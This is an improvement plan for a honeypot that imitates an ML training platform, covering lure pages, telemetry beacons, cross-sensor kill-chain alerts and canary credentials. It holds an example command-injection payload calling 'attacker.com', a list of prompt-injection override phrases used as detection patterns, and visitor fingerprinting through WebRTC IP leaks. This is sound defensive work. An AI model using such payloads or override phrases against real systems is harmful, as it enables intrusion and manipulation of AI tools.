# Neuro Honeypot — Improvement & Fix Plan

Generated from three-agent audit (frontend deception, backend architect, deployment gatekeeper).
All findings are grounded in the live deployed system on 158.220.110.47.

**Gatekeeper scores (pre-fix):**
- Intelligence Value: 5/10
- Survivability vs bots: 6/10
- Survivability vs human attacker: 2/10

---

## THE BIG THREE (Fix before anything else)

| # | Item | File(s) | Effort | Impact |
|---|---|---|---|---|
| BIG-1 | Register real canarytokens.org tokens for AWS key, WandB key, HF token | No code change | 30 min | Post-exfiltration tracking |
| BIG-2 | Populate `attacker_sessions` table on every `PostgresWriter.write()` call | `log_shipper.py` | 2h | Kill chain provability |
| BIG-3 | Fix hostname contradiction: SSH honeyfs says `neurocore-gpu01`, HTTP says `neuro-train-01` | Cowrie fs.pickle | 10 min | Human attacker survivability |

**Why these three first:** BIG-1 is the only mechanism that tracks attacker behavior after they leave the VPS. BIG-2 makes "we tracked adversaries across the full kill chain" provable — currently the `attacker_sessions` table has the right columns but is entirely empty. BIG-3 is caught by any human attacker within ~10 minutes of comparing the two surfaces.

---

## P0 — Must Fix (Quick wins, high impact)

### ~~P0-1~~: Load `metrics.js` on login page ✓ DONE
- **File:** `frontend-latest/login.html` → add `<script src="/static/js/metrics.js"></script>` to `{% block scripts %}`
- **Gap:** Login page is highest-volume entry point. No canvas fingerprint, no WebRTC LAN IP leak, no mouse movement sampling. `auth.js` loads but not `metrics.js`.
- **Captures:** Canvas fingerprint (browser/OS uniqueness), real LAN IP behind VPN via WebRTC leak, time on page (scanner vs. human), mouse movement absence (automated vs. human)
- **Effort:** 5 min

### ~~P0-2~~: Load `metrics.js` on `admin.html` and `api_keys.html` ✓ DONE
- **File:** `frontend-latest/admin.html`, `frontend-latest/api_keys.html` → same one-line addition
- **Gap:** No canvas fingerprint on admin re-auth. No pagehide dwell on API keys page.
- **Effort:** 5 min

### ~~P0-3~~: Add JS telemetry to `jobs_new.html` ✓ DONE
- **File:** `frontend-latest/jobs_new.html`
- **Gap:** RCE trap page has zero JavaScript. No page-view beacon, no keystroke capture on `startup_script` textarea, no paste event, no pagehide. An attacker typing incremental payloads (`ls` → `whoami` → `$(curl attacker.com)`) has every non-matching submission invisible.
- **What to build:**
  - `DOMContentLoaded` → fire `page_view` beacon
  - Debounced `input` event on `#startup-script` → beacon with content length + sha256 of first 32 chars (not full value)
  - `onsubmit` → fire `form_interaction` beacon with full `startup_script` value before POST
  - `pagehide` → fire beacon with dwell time and whether form was submitted
- **Captures:** Incremental RCE payload construction, paste from exploit cheatsheets, dwell time, abandonment vs. submission
- **Effort:** 1h

### ~~P0-4~~: Add JS telemetry to `artifacts.html` ✓ DONE
- **File:** `frontend-latest/artifacts.html`
- **Gap:** LFI page has zero JavaScript. Download button clicks fire `showToast()` only. Can't distinguish hover from aggressive clicking. Model-manifest download link points to `/api/v1/models` (returns model list) instead of `/api/v1/lure/model-manifest`.
- **What to build:**
  - `DOMContentLoaded` → fire `page_view` beacon
  - Each Download button `onclick` → fire `{event_type: 'artifact_download_click', filename: '...'}` before toast
  - Fix `model-manifest.json` download href to `/api/v1/lure/model-manifest`
  - `pagehide` → fire dwell time beacon
- **Captures:** Specific model files targeted, dwell time, path traversal typing patterns
- **Effort:** 1h

### ~~P0-5~~: Add telemetry to `api_docs.html` filter tags and endpoint expansions ✓ DONE
- **File:** `frontend-latest/api_docs.html`
- **Gap:** `filterTag()` and `toggleEndpoint()` are pure DOM operations — nothing sent to telemetry. This is the highest-intent-signal page: clicking "internal" tag = wants unauthenticated endpoints; expanding `GET /.env` = misconfiguration hunting.
- **What to build:** Add `fetch('/api/v1/telemetry', ...)` inside `filterTag()` with `{event_type: 'docs_filter', tag: tag}` and inside `toggleEndpoint()` with `{event_type: 'endpoint_expanded', method, path}`. Also add `/api/docs` to `_LURE_PATHS` in `main.py`.
- **Captures:** Exact attack vector declared by tag choice, specific endpoints researched, order of exploration
- **Effort:** 1h

### ~~P0-6~~: Fix hostname contradiction ✓ DONE (Session 2 — fs.pickle patched, neurocore-gpu01 → neuro-train-01)
- **File:** Cowrie fs.pickle + SSH banner config
- **Gap:** SSH honeyfs contains `neurocore-gpu01` as hostname. HTTP layer says `neuro-train-01`. Human attacker finds this within ~10 minutes.
- **Fix:** Patch fs.pickle to replace `neurocore-gpu01` with `neuro-train-01` in all fake filesystem files (`/etc/hostname`, `/etc/hosts`, bash history, config files). Update SSH banner if set.
- **Effort:** 10 min

### ~~P0-7~~: Register real canarytokens ✓ DONE (Session 2 — AWS key AKIAYZM57LXRGIYTCOUV registered at canarytokens.org, embedded in /.env, config.yaml, Cowrie fs.pickle)
- **No code change required**
- **Gap:** AWS key `AKIAQF3ZXVN2MPLR8KT4`, WandB key, HuggingFace token in `.env` / `config.yaml` are unregistered props. When attacker exfiltrates and uses them from their real machine, zero notification.
- **Fix:**
  1. Register `AKIAQF3ZXVN2MPLR8KT4` with canarytokens.org "AWS API Key" type — notifies on any AWS API call using this key ID, worldwide, free
  2. Create a real WandB account (`neuro-ai` workspace), generate real API key, enable audit webhook, embed key in lure files
  3. Create a real HuggingFace account, generate real token, embed in lure files — HF provides token usage audit logs
- **Captures:** Attacker behavior after leaving VPS — proves exfiltration + credential replay
- **Effort:** 30 min

---

## P1 — High Value (1–3 hours each)

### ~~P1-1~~: Add `/api/v1/cluster/nodes` endpoint (HTTP→SSH kill chain bridge) ✓ DONE
- **File:** `deploy/module-6-honeypot-api/src/main.py`
- **Gap:** Biggest missing route. An attacker who enumerates the HTTP platform has no natural path to the SSH sensor. Kill chain is broken at HTTP boundary.
- **What to build:**
  ```python
  @app.get("/api/v1/cluster/nodes")
  async def cluster_nodes(request: Request):
      return JSONResponse({
          "cluster": "neuro-train-01",
          "nodes": [
              {"name": "neuro-train-01", "ip": "10.31.4.22", "status": "running",
               "ssh_port": 22, "ssh_fingerprint": "SHA256:k3Yxxx",
               "gpu_util": 87.4, "role": "primary",
               "note": "Direct SSH requires neuro-svc credentials. See /config.yaml."},
              {"name": "neuro-train-02", "ip": "10.31.4.23", "status": "idle", "role": "standby"}
          ]
      })
  ```
  - Add to `_LURE_PATHS`
  - Add to `api_docs.html` endpoint list
  - Reference in dashboard alert banner: *"Node neuro-train-01 reported elevated memory — SSH in to inspect. See /api/v1/cluster/nodes"*
- **Captures:** Attacker copies IP → connects to Cowrie. Creates HTTP-session-to-SSH-session correlation event proving kill chain.
- **Effort:** 1h

### ~~P1-2~~: Add SSH credential cross-references to HTTP layer ✓ DONE
- **Files:** `frontend-latest/jobs_new.html`, `frontend-latest/artifacts.html`, `deploy/module-6-honeypot-api/src/main.py` (`.env` lure)
- **Gap:** No content in the HTTP UI gives an attacker reason to try SSH. The kill chain break is partly a content problem, not just a route problem.
- **What to build:**
  - `jobs_new.html` resource sidebar: `SSH access: neuro-svc@neuro-train-01.internal (key: ~/.ssh/neuro_ed25519)`
  - `artifacts.html` HTML comment: `<!-- TODO: revoke neuro-svc SSH key on neuro-train-01 after Q2 audit — key still active (priya.nair @ 2026-04-10) -->`
  - `.env` lure: add `TRAIN_NODE_SSH_KEY=/home/neuro-svc/.ssh/id_ed25519`
  - `dashboard.html` HTML comment: `<!-- node IPs: neuro-train-01:10.31.4.22, neuro-train-02:10.31.4.23 — internal DNS not yet propagated (IT#5289) -->`
- **Effort:** 45 min

### ~~P1-3~~: Cross-sensor credential correlation in sentinel ✓ DONE
- **File:** `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** An attacker submitting `NeuroAdmin2024!` to HTTP login then trying the same password on Cowrie SSH is the most valuable kill-chain signal the system can produce — currently completely invisible.
- **What to build:** Secondary query in sentinel poll loop:
  ```sql
  SELECT src_ip, password, array_agg(DISTINCT sensor) AS sensors
  FROM honeypot_events
  WHERE password IS NOT NULL
    AND created_at > NOW() - INTERVAL '24 hours'
  GROUP BY src_ip, password
  HAVING COUNT(DISTINCT sensor) > 1;
  ```
  Fire a priority-0 alert with 4-hour per-IP cooldown: *"CREDENTIAL REPLAY DETECTED — {src_ip} used same password across {sensors}"*
- **Effort:** 2h

### ~~P1-4~~: Multi-sensor kill chain alert in sentinel ✓ DONE
- **File:** `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** If an IP hits HTTP + SSH + MariaDB within 60 minutes, three separate cooldown-suppressed alerts arrive. No combined "kill chain traversal" alert.
- **What to build:**
  ```sql
  SELECT src_ip, array_agg(DISTINCT sensor) AS sensors, COUNT(*) AS event_count
  FROM honeypot_events
  WHERE created_at > NOW() - INTERVAL '60 minutes'
  GROUP BY src_ip
  HAVING COUNT(DISTINCT sensor) >= 3;
  ```
  Fire `multi_sensor.kill_chain` alert with 24-hour per-IP cooldown. Fire only when an IP crosses the 3-sensor threshold for the first time (track in sentinel's in-memory seen set).
- **Effort:** 1h

### ~~P1-5~~: Lure credential use triggers priority-0 alert ✓ DONE
- **File:** `deploy/module-6-honeypot-api/src/main.py`, `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** An attacker submitting valid lure credentials is treated as a generic HTTP event subject to the 30-min cooldown. No dedicated alert.
- **What to build:**
  - In `api_auth()`, after lure credential match, set internal response header `X-Lure-Credential-Used: true`
  - Middleware reads header, overrides `event_type` to `http.lure.credential.success`
  - In sentinel: add `http.lure.credential.success` to a `_NO_COOLDOWN_EVENTS` set — every occurrence fires immediately: *"LURE CREDENTIAL USED — {email} / {password} from {src_ip}"*
- **Effort:** 1.5h

### ~~P1-6~~: Populate `attacker_sessions` table ✓ DONE
- **File:** `deploy/module-5-log-shipper/src/log_shipper.py` — `PostgresWriter.write()`
- **Gap:** Schema defines `sensors_hit`, `credentials_tried`, `commands_run`, `threat_score` but nothing writes to this table. The `session_id` FK in `honeypot_events` points to sessions that don't exist.
- **What to build:** After every main INSERT, execute:
  ```sql
  INSERT INTO attacker_sessions (session_id, src_ip, first_seen, last_seen, event_count, sensors_hit)
  VALUES (%s, %s, %s, %s, 1, ARRAY[%s])
  ON CONFLICT (session_id) DO UPDATE
    SET last_seen = EXCLUDED.last_seen,
        event_count = attacker_sessions.event_count + 1,
        sensors_hit = array_append(attacker_sessions.sensors_hit, EXCLUDED.sensors_hit[1])
  WHERE NOT (EXCLUDED.sensors_hit[1] = ANY(attacker_sessions.sensors_hit));
  ```
- **Effort:** 2h

### ~~P1-7~~: Populate `threat_score`, `tags`, `is_tor` columns ✓ DONE (Session 3 — scoring table + tags derived from event_type deployed in log_shipper.py; is_tor stub wired but TOR exit list download not yet live — see CRIT-2 in session-7-plan.md)
- **File:** `deploy/module-5-log-shipper/src/log_shipper.py`
- **Gap:** These columns are schema-defined but always null/false. GIN index on `tags` and index on `threat_score` are completely unused.
- **What to build:**
  - Scoring table: SSH login success=90, file download=85, RCE/LFI attempt=80, SQLi=75, lure credential submit=70, `.env`/`config.yaml` access=60, new IP first contact=30
  - Tags derived from event_type: `cowrie.session.file_download` → `['malware-delivery']`, `http.lfi.attempt` → `['web-attack']`, `cowrie.login.failed` > 10 attempts → `['brute-force']`
  - TOR check: download TOR exit list from `https://check.torproject.org/torbulkexitlist` daily, check `src_ip` at insert time, set `is_tor = true`
- **Effort:** 2h

### ~~P1-8~~: Fix sidebar nav links that return JSON instead of HTML ✓ DONE (Session 5 — /runs, /models, /datasets now render proper Jinja2 templates)
- **File:** `frontend-latest/base.html` + new template files + `main.py`
- **Gap:** Clicking "Runs", "Models", "Datasets" in the nav sidebar drops the user from polished dark UI to raw JSON (`/api/v1/training/jobs`, `/api/v1/models`, `/api/v1/data/datasets`). No real SaaS does this — immediate tell for any attacker who navigates.
- **What to build:** Add HTML routes at `/runs`, `/models`, `/datasets` rendering proper Jinja2 templates with the sidebar and session-gating. Minimum viable: render the same data from the dashboard JS arrays in proper table format. Each page hit is logged separately.
- **Effort:** 3h

### ~~P1-9~~: `bot_score` used in sentinel alerting ✓ DONE (Session 5 — bot_score parsed from payload JSONB, human-like sessions flagged ⚠️ in Telegram alerts)
- **File:** `deploy/module-5-log-shipper/src/sentinel.py`
- **Gap:** `bot_score` is computed and stored in `payload` JSONB but sentinel never reads it. A human-like session (score < 0.3) and a sqlmap run (score 0.9) get identical alert treatment.
- **What to build:** Include `payload->>'bot_score'` in sentinel's SELECT. Add to alert message body. For sessions where bot_score < 0.3 AND a lure path is accessed, prefix alert: *"POSSIBLE HUMAN ATTACKER"*. This is the most interesting class of events for the pitch.
- **Effort:** 1h

---

## P2 — Depth and Completeness

### ~~P2-1~~: `/notifications` page with SSH node hints ✓ DONE (Session 4 — 8 alerts with SSH kill-chain hints, notification bell dropdown)
- **File:** New `frontend-latest/notifications.html` + `main.py` route
- **What to build:** Page listing 8–10 fake notifications:
  - *"run-001 completed — checkpoint saved to neuro-train-01.internal:/data/checkpoints/run-001/step-5000"* (HIGH: SSH target + path)
  - *"neuro-train-01 — disk at 87% on /data. SSH in to clean up."*
  - *"API key expiry: priya.nair-pipeline expires 2026-06-15"*
  - *"Deployment failed: llama3-8b prod — see /debug/logs"*
  - Add notification bell icon to dashboard with red "3 unread" badge
  - Add to `_LURE_PATHS`
- **Captures:** Dwell time, follow-up SSH attempts triggered by node alert
- **Effort:** 2h

### ~~P2-2~~: `/settings/profile` page with SSH key copy telemetry ✓ DONE (Session 4 — SSH key copy fires ssh_key_copy telemetry beacon)
- **File:** New `frontend-latest/settings_profile.html` + `main.py` route
- **What to build:** Profile page showing:
  - User: Ming Chen, m.chen@neuro.ai
  - SSH Public Key: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFake...key== m.chen@neuro-train-01` with Copy button
  - Copy button fires: `{event_type: 'ssh_key_copy', user: 'm.chen'}`
  - *"Your SSH key is authorized on: neuro-train-01.internal, neuro-train-02.internal"*
- **Captures:** SSH key copy event = attacker intends to try key against Cowrie. Strong pivot signal.
- **Effort:** 2h

### ~~P2-3~~: `/settings/security` page — DROPPED (Session 7 — low attack value, cuts into build time)
- **File:** New template + `main.py` route + `POST /api/v1/settings/security/backup-email`
- **What to build:** Shows current 2FA status, "Add backup email" form. POST endpoint logs submitted email to `username` column of `honeypot_events`.
- **Captures:** Attacker's own email address if they use their real one — identity artifact
- **Effort:** 2h

### ~~P2-4~~: `/search` endpoint — DROPPED (Session 7 — superseded by SSRF remote-import which is a stronger, more AI-platform-authentic attack surface)
- **File:** New template + `main.py` route `GET /search?q=...`
- **What to build:** Search bar in dashboard top bar. Returns 3–5 plausible non-functional results. Logs `q` as `{event_type: 'search', query: q}`. `_detect_web_attack()` already handles XSS/SQLi patterns.
- **Captures:** XSS payloads (tool fingerprinting), SQLi payloads (confirms intent), search terms revealing hunting targets ("password", "admin", "secret")
- **Effort:** 1.5h

### ~~P2-5~~: DevTools detection in `metrics.js` ✓ DONE (Session 3 — F12/Ctrl+Shift+I key detection + side-panel polling added)
- **File:** `deploy/module-6-honeypot-api/src/static/js/metrics.js`
- **What to build:**
  ```javascript
  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u'))
      fetch('/api/v1/telemetry', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({type:'dev_tools_key', key: e.key, ts: Date.now()})}).catch(function(){});
  });
  // Poll for side-panel open:
  setInterval(function() {
    if (window.outerWidth - window.innerWidth > 160)
      fetch('/api/v1/telemetry', {method:'POST', body: JSON.stringify({type:'devtools_panel_open'})}).catch(function(){});
  }, 1000);
  ```
- **Captures:** Confirms manual human inspection vs. automated scanning — clearest indicator of a skilled attacker
- **Effort:** 30 min

### ~~P2-6~~: Fix `X-Debug-Mode` header scope ✓ DONE (Session 1 — scoped to lure paths only)
- **File:** `deploy/module-6-honeypot-api/src/main.py` middleware
- **Gap:** `X-Debug-Mode: enabled` sent on every response including 404s. No real production app does this globally — a sophisticated security researcher spots this as a honeypot indicator immediately.
- **Fix:** Only add header for routes that are in `_LURE_PATHS` or explicitly in a debug-lure set (`.env`, `config.yaml`, `api/v1/internal/*`). All other routes get normal production headers: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: same-origin`.
- **Effort:** 30 min

### ~~P2-7~~: Add `/.git/config` and `/.git/HEAD` routes ✓ DONE (Session 1 — plain-text responses added)
- **File:** `main.py`
- **Gap:** `/.git/config` in `_LURE_PATHS` returns JSON 404. Attackers doing git repository exposure enumeration expect plain text. Content-type mismatch is detectable.
- **What to build:**
  ```python
  @app.get("/.git/config")
  async def git_config(request: Request):
      return PlainTextResponse("""[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n[remote "origin"]\n\turl = git@github.com:cyvera-ai/neuro-platform.git\n\tfetch = +refs/heads/*:refs/heads/*\n[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n""")

  @app.get("/.git/HEAD")
  async def git_head(request: Request):
      return PlainTextResponse("ref: refs/heads/main\n")
  ```
- **Effort:** 20 min

### ~~P2-8~~: Dataset download button telemetry ✓ DONE (Session 3 — all 5 Download buttons beacon dataset_download_click with filename + classification)
- **File:** `frontend-latest/dashboard.html`
- **Gap:** "CONFIDENTIAL: internal_slack_logs_Q1.jsonl" and "RESTRICTED: medical_records_deidentified.parquet" download buttons call `showToast()` only. Most enticing names on the site — not knowing when they're clicked is a significant gap.
- **What to build:** Change onclick to `downloadDataset(filename, classification)` which beacons `{event_type: 'dataset_download_click', filename, classification}` before toast.
- **Effort:** 30 min

### ~~P2-9~~: API key reveal + stored key replay detection — DROPPED (Session 7 — superseded by canarytoken CSV which covers credential exfiltration story better and with out-of-band tracking)
- **File:** `frontend-latest/api_keys.html`, `main.py`
- **Gap:** Keys are masked with no Reveal toggle. Generated keys are never stored — if attacker replays a key in `Authorization: Bearer` header, it's unrecognizable.
- **What to build:**
  - Add "Reveal" button that fires `{event_type: 'key_reveal', key_name}` beacon and shows full key value
  - Store generated keys in Redis hash: `api_keys:{key} → {created_at, src_ip, session_id}` with 30-day TTL
  - Middleware: check `Authorization: Bearer {key}` against Redis hash. Match → emit `http.canarytoken.api_key_used`
- **Effort:** 2h

### ~~P2-10~~: Kill chain stage state machine ✓ DONE (2026-06-05 — kill_chain_stage column added; _classify_kill_chain_stage in log_shipper.py for SSH/network events; _classify_http_kill_chain_stage in main.py for HTTP events; _check_kill_chain_stages in sentinel.py fires ⚡/💀 alert when session reaches EXECUTION/EXFILTRATION; verified live on VPS)
- **File:** `deploy/module-5-log-shipper/src/log_shipper.py`, schema
- **Gap:** No MITRE ATT&CK stage classification. "Tracked adversaries across full kill chain" is a strong FYP claim — needs automatic classification to prove it.
- **What to build:** Add `kill_chain_stage` column to `attacker_sessions`. State machine in consumer thread:
  - First HTTP GET or TCP probe → `RECON`
  - Login attempt (any sensor) → `INITIAL_ACCESS`
  - SSH `id`/`whoami`/`uname`, or HTTP `/admin/users` access → `DISCOVERY`
  - `.env` / `config.yaml` / `/api/v1/internal/config` access → `CREDENTIAL_ACCESS`
  - `cowrie.session.file_download` or `/jobs/new` RCE → `EXECUTION`
  - `wget`/`curl` to external IP, or `/api/v1/data/download` → `EXFILTRATION`
  - Each transition emits `killchain.transition` event. Sentinel fires priority alert on `EXECUTION` or beyond.
- **Effort:** 3h

### ~~P2-11~~: `settings/workspace` as proper HTML page — DROPPED (Session 7 — low demo value, cuts into 2-day build window)
- **File:** New `settings_workspace.html` + `main.py`
- **Gap:** `GET /settings/workspace` returns raw JSON. Settings nav link leads to JSON context-switch — obvious tell.
- **What to build:** Render a proper settings page: workspace name, region, tier, team member list, "Change tier" form that fires telemetry.
- **Effort:** 2h

### ~~P2-12~~: Fix `api_docs.html` consistency issues ✓ DONE (Session 1 — domain/SSO/route-count fixes applied)
- **File:** `frontend-latest/api_docs.html`
- **Gaps:**
  - Base URL shows `neurodata.me` (old domain) — change to `neuro.cyveera.com`
  - Says "Microsoft SSO" — login page has Google Workspace SSO button — change to Google Workspace in docs
  - Says "47 routes registered" but ~35 actually exist — update count or add stub routes
- **Effort:** 30 min

### ~~P2-13~~: Footer on all authenticated pages ✓ DONE (Session 1 — footer block added to base.html)
- **File:** `frontend-latest/base.html`
- **Gap:** All authenticated pages have no footer. Real SaaS platforms always do.
- **What to build:** `© 2025 Cyvera AI Infrastructure Ltd · Neuro v2.3.1 · Terms · Privacy · Status` — Terms/Privacy routes already exist. Status links to new `/status` stub.
- **Effort:** 30 min

### ~~P2-14~~: `admin.html` username from session, not hardcoded ✓ DONE (Session 7 — _SESSION_USER_MAP populated on lure credential login; admin_page reads from map with m.chen fallback; admin.html pre-fills and locks username field via {{ current_user }})
- **File:** `main.py` `GET /admin`, `api_auth()`, `frontend-latest/admin.html`
- **Gap:** Admin re-auth always shows `m.chen@neuro.ai` regardless of which persona's credentials were used.
- **Fix:** On POST `/api/v1/auth` success, write `session:{session_id}:user → email` to Redis. Read it back in `GET /admin`, pass as `current_user` to template.
- **Effort:** 1h

---

## P3 — Extended Coverage (Half-day+ each)

### ~~P3-1~~: IP reputation enrichment pipeline ✓ DONE (2026-06-05 — TOR exit list refresh thread in log_shipper.py; _refresh_tor_list() downloads from torproject.org every 6h; _is_tor() used in PostgresWriter.write(); sentinel shows 🧅 on TOR attacker alerts)
- **Files:** `log_shipper.py`, new `ip_reputation` table
- **What to build:** Background enrichment worker (runs every 6h):
  - Download TOR exit list daily from torproject.org (~7KB), check IPs at insert time
  - AbuseIPDB free API (1000 lookups/day) for `abuseConfidenceScore` on unique IPs
  - Store in `ip_reputation` table: `ip`, `is_tor`, `is_vpn`, `abuse_score`, `is_known_scanner`, `last_checked`
  - UPDATE corresponding `honeypot_events` rows to set `is_tor`, `tags`
- **Effort:** 3h

### ~~P3-2~~: Prompt injection detection ✓ DONE (2026-06-05 — _PROMPT_INJECTION_PATTERNS list; /api/v1/inference POST handler detects and logs http.prompt.injection with matched pattern + body preview; sentinel: 🤖 PROMPT INJECTION ATTEMPT header)
- **File:** `main.py`
- **What to build:** `_PROMPT_INJECTION_PATTERNS` list: `"ignore previous"`, `"disregard all"`, `"system prompt"`, `"you are now"`, `"jailbreak"`, `"DAN"`, `"act as"`. Detected patterns on `/api/v1/inference` → emit `http.prompt.injection` event type. Sentinel: high-priority alert category.
- **Captures:** AI-specific attacker sophistication — attacker believes this is a real LLM API
- **Effort:** 2h

### P3-3: SMB sensor via OpenCanary ⚠️ REVERTED (2026-06-05 — CRIT-R28-1: OpenCanary SMB module requires running Samba/smbd with full_audit VFS; Dockerfile has no samba; dark port 445 is a honeypot fingerprint tell worse than no SMB at all. smb.enabled=false, port 445 DNAT removed from honeypot-dnat.sh. To deploy properly: add samba to Dockerfile, ship smb.conf with vfs objects=full_audit, bind 445 in compose, verify smbclient -L event in opencanary.json.)
- **File:** `deploy/module-3-opencanary/opencanary.conf.example`, `honeypot-dnat.sh`
- **What to build:** Enable `"smb.enabled": true, "smb.port": 445`. Fake NetBIOS name `NEUROCORE-GPU01`, share name `datasets`. Add DNAT rule for port 445. OpenCanary logs NTLM challenge/response (logtype 8000/8001).
- **Captures:** Windows domain credentials (NTLM hashes) — highest-value credential surface for Windows attackers
- **Effort:** 2h

### ~~P3-4~~: SMTP minimal listener ✓ CODED — ⚠️ DEPLOYMENT DEFERRED (2026-06-05 — Gatekeeper verdict: CONDITIONAL/DEFER. Cover story mismatch: ML platform with Google Workspace SSO has no reason to run inbound MX. Open relay abuse risk: `250 Ok: queued` after DATA could trigger Spamhaus/Contabo abuse on shared VPS. Postfix banner without STARTTLS is instant tell. Code complete at deploy/module-8-smtp-lure/ but NOT deployed. To deploy later: reject after DATA, add STARTTLS stub, reframe as submission port 587, align banner domain to neuro.cyveera.com, revert DNAT port 25 to OpenCanary or leave disabled.)
- **What to build:** Minimal Python asyncio SMTP listener speaking ESMTP (220/250/354/550). Captures MAIL FROM, RCPT TO, DATA body. Logs to file tailed by log-shipper.
- **Captures:** VRFY/EXPN user enumeration, spam relay attempts, phishing payloads
- **Effort:** 3h

### ~~P3-5~~: Jupyter stub externally exposed ✓ DONE (2026-06-05 — nginx /jupyter/ location proxies to honeypot-api:8888 with WebSocket support; redirect /jupyter → /jupyter/; jupyter_stub.py form action fixed to /jupyter/login)
- **File:** `deploy/module-7-nginx/config/neuro.conf`, `jupyter_stub.py`
- **Gap:** `jupyter_stub.py` runs on loopback :8888 only — invisible to external attackers. Jupyter unauthenticated RCE is actively exploited against ML infrastructure.
- **Fix:** Expose via nginx at `/jupyter` path prefix with token auth. Capture attempted token values and notebook execution POSTs.
- **Effort:** 2h

### P3-6: `/notifications`, `/settings/profile`, `/settings/security`, `/status` pages
- Already detailed in P2-1, P2-2, P2-3 above
- Bundle as a single frontend session: create all four templates + routes together
- **Effort:** 4h total

### ~~P3-7~~: Fake team activity feed — DROPPED (Session 7 — not a sensor, no attack capture value)
- **File:** `frontend-latest/dashboard.html`
- **Gap:** No recent activity visible anywhere. Absence of team activity is a subtle tell for a platform with no real users.
- **What to build:** "Recent Activity" card in dashboard overview:
  - *"priya.nair deployed mistral-7b-rlhf to inference cluster · 4h ago"*
  - *"m.chen started run-007 · 8h ago"*
  - *"svc-deploy exported model manifest · 2026-05-22 03:17"*
  - `onclick` on each item → `{event_type: 'activity_item_clicked', item: ...}` beacon
- **Effort:** 1h

### ~~P3-8~~: Support ticket widget — DROPPED (Session 7 — not a sensor, no attack capture value)
- **File:** `main.py`, `frontend-latest/dashboard.html`
- **What to build:** `?` help icon in dashboard top-right → modal with "Contact IT Support — describe your issue" textarea. `POST /api/v1/support/ticket` logs body field. Response: `{"ticket_id": "IT-8831", "message": "Response within 2 business days."}`.
- **Captures:** Free-text attacker notes, possible native language (attribution signal), operational errors revealing intent
- **Effort:** 1.5h

### ~~P3-9~~: Double URL-encoding bypass fix for `_detect_web_attack()` ✓ DONE (Session 7 — urllib.parse.unquote_plus() applied twice in _detect_web_attack() before pattern matching)
- **File:** `main.py`
- **Gap:** `%2527` → `%27` → `'` (double-encoded SQLi) bypasses all pattern matching. Unicode normalization variants (`%c0%af`, `%ef%bc%8f`) also bypass LFI patterns.
- **Fix:** Apply `urllib.parse.unquote_plus()` twice before pattern matching. Add Unicode normalization sequences to `_LFI_PATTERNS`.
- **Effort:** 1h

### ~~P3-10~~: MariaDB credential relay detection ✓ DONE (2026-06-05 — _check_mariadb_credential_relay() in log_shipper.py; fires on MariaDB connect if same IP read config.yaml over SSH in last 30m; emits cross_sensor.credential_relay event; sentinel: 🔗🔑 CREDENTIAL RELAY header, always alert)
- **File:** `log_shipper.py` consumer thread
- **Gap:** Attacker SSHes in, `cat`s `~/.config/neuro/config.yaml`, then connects to MariaDB with that password — two unlinked events. The "credential relay" signal is invisible.
- **Fix:** When processing a MariaDB connect event, query recent Cowrie `command.input` events from same `src_ip` containing `config.yaml` within last 30 minutes. If found, add `cross_sensor_link` to the MariaDB event payload, emit a `cross_sensor.credential_relay` event.
- **Effort:** 2h

---

## Implementation Order Summary

```
Week 1 — P0 (total ~6h):
  [ ] BIG-3: Fix hostname contradiction (10 min)
  [ ] BIG-1: Register canarytokens (30 min)
  [ ] P0-1 + P0-2: Load metrics.js on login/admin/api_keys (15 min)
  [ ] P0-3: JS telemetry on jobs_new.html (1h)
  [ ] P0-4: JS telemetry on artifacts.html (1h)
  [ ] P0-5: api_docs telemetry + _LURE_PATHS (1h)
  [ ] P2-5: DevTools detection in metrics.js (30 min)
  [ ] P2-7: /.git/config and /.git/HEAD routes (20 min)
  [ ] P2-6: Scope X-Debug-Mode header (30 min)

Week 2 — P1 Backend (total ~12h):
  [ ] BIG-2: Populate attacker_sessions table (2h)
  [ ] P1-3: Cross-sensor credential correlation (2h)
  [ ] P1-4: Multi-sensor kill chain alert (1h)
  [ ] P1-5: Lure credential priority-0 alert (1.5h)
  [ ] P1-7: Populate threat_score + tags + is_tor (2h)
  [ ] P1-9: bot_score used in sentinel alerting (1h)
  [ ] P2-10: Kill chain stage state machine (3h)

Week 3 — P1/P2 Frontend (total ~10h):
  [ ] P1-1: /api/v1/cluster/nodes endpoint (1h)
  [ ] P1-2: SSH credential cross-references in HTTP layer (45 min)
  [ ] P1-8: Fix sidebar nav JSON links → HTML pages (3h)
  [ ] P2-1: /notifications page (2h)
  [ ] P2-2: /settings/profile page (2h)
  [ ] P2-12: Fix api_docs consistency (30 min)
  [ ] P2-13: Footer on authenticated pages (30 min)

Week 4 — P2/P3 Extended:
  [ ] P2-9: API key reveal + replay detection (2h)
  [ ] P3-6: /settings/security + /status pages (2h)
  [ ] P3-7: Team activity feed (1h)
  [ ] P3-8: Support ticket widget (1.5h)
  [ ] P3-10: MariaDB credential relay detection (2h)
  [ ] P3-3: SMB sensor (2h)
  [ ] P3-1: IP reputation enrichment (3h)
```

---

## Files Changed Per Module

| Module | Files | Changes |
|---|---|---|
| Frontend templates | `frontend-latest/*.html` | metrics.js loading, telemetry blocks, nav links, footers, new pages |
| `main.py` | `deploy/module-6-honeypot-api/src/main.py` | New routes, session username, debug header scope, canarytoken key storage |
| `metrics.js` | `deploy/module-6-honeypot-api/src/static/js/metrics.js` | DevTools detection |
| `log_shipper.py` | `deploy/module-5-log-shipper/src/log_shipper.py` | attacker_sessions write, threat_score/tags, kill chain state machine, credential relay detection |
| `sentinel.py` | `deploy/module-5-log-shipper/src/sentinel.py` | Priority alerts, multi-sensor query, bot_score usage, credential correlation |
| Cowrie | fs.pickle, cowrie.cfg | Hostname fix |
| OpenCanary | `opencanary.conf.example` | SMB enable (P3) |
| DNAT | `honeypot-dnat.sh` | Port 445 for SMB (P3) |
| Schema | PostgreSQL migrations | kill_chain_stage column, ip_reputation table (P3) |

---

## Frontend P3 — `/settings/security` and `/status` Pages

